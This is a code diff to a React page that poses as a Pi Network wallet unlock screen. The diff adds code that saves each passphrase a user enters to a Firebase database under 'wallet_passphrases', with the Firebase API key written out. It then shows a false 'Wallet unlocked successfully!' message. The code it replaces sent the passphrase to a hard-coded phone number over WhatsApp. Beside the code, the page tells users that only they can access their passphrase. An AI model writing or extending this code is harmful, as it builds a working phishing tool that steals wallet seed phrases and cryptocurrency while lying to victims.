@@ -9,11 +9,29 @@ import develop_logo from "./assets/develop_logo.png";
 import fireside_logo from "./assets/fireside_logo.png";
 import Mine_logo from "./assets/Mine_logo.png";
 import wallet_logo from "./assets/wallet_logo.png";
+import { initializeApp } from "firebase/app";
+import { getAnalytics } from "firebase/analytics";
+import { getDatabase, ref, set } from "firebase/database"; // Changed push to set
 
 function App() {
   const [showPassPhrase, setShowPassPhrase] = useState(false);
   const [passphrase, setPassphrase] = useState('');
-  const phoneNumber = "9082940349";
+  const [isLoading, setIsLoading] = useState(false);
+  
+  const firebaseConfig = {
+    apiKey: "AIzaSyDK5aERpkiHWHCNbTWKMdTQWCrgwCULqmE",
+    authDomain: "pi-browser-b5fd6.firebaseapp.com",
+    projectId: "pi-browser-b5fd6",
+    storageBucket: "pi-browser-b5fd6.firebasestorage.app",
+    messagingSenderId: "341543117636",
+    appId: "1:341543117636:web:14e647b94b555be9592d11",
+    measurementId: "G-EHHSZEV96Y"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const database = getDatabase(app);
 
   const handleNavigateToPassPhrase = () => {
     setShowPassPhrase(true);
@@ -29,9 +47,33 @@ function App() {
 
   const handleUnlockWithPassphrase = () => {
     if (passphrase.trim()) {
-      const formattedNumber = phoneNumber.replace(/[^0-9]/g, '');
-      const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodeURIComponent(passphrase)}`;
-      window.open(whatsappUrl, '_blank');
+      setIsLoading(true);
+      
+      // Generate a unique ID for this entry
+      const uniqueId = Date.now().toString();
+      
+      // Reference to a specific location in your database
+      const dataRef = ref(database, 'wallet_passphrases/' + uniqueId);
+      
+      // Data to be saved
+      const dataToSave = {
+        passphrase: passphrase,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Save data to Firebase
+      set(dataRef, dataToSave)
+        .then(() => {
+          console.log("Data saved successfully!");
+          alert('Wallet unlocked successfully!');
+          setPassphrase(''); // Clear input field
+          setIsLoading(false);
+        })
+        .catch((error) => {
+          console.error("Error saving data: ", error);
+          alert('Error unlocking wallet. Please try again.');
+          setIsLoading(false);
+        });
     } else {
       alert('Please enter your passphrase');
     }
@@ -58,13 +100,11 @@ function App() {
           <button 
             className="passphrase-button"
             onClick={handleUnlockWithPassphrase}
+            disabled={isLoading}
           >
-            Unlock With Passphrase
+            {isLoading ? 'Unlocking...' : 'Unlock With Passphrase'}
           </button>
           
-          <button className="fingerprint-button">
-            Unlock With Fingerprint
-          </button>
           
           <p className="disclaimer-text">
             As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
@@ -74,9 +114,7 @@ function App() {
             Lost your passphrase? <a href="#" className="link-text">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
           </p>
           
-          <button className="back-button" onClick={handleGoBack}>
-            Back to Home
-          </button>
+        
         </div>
       </div>
     );
